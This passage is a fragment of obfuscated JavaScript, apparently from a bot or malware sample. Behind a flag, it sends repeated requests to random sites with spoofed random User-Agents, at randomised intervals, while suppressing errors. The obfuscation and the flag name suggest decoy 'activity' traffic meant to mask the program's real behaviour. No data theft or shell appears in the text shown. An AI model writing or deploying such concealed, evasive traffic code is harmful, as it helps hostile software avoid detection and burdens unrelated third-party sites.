})()), doFlags[V(0x3, 'c2oM') + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x3 * -0xf0b + 0x692 + 0x185b * -0x1) * getRandomInt(0x220f * -0x1 + -0x1 * -0x1901 + 0x90f, -0x8d * 0x43 + 0x1c46 + 0x8a6));
}, -0x884 + 0x43 * -0x13 + 0xde1);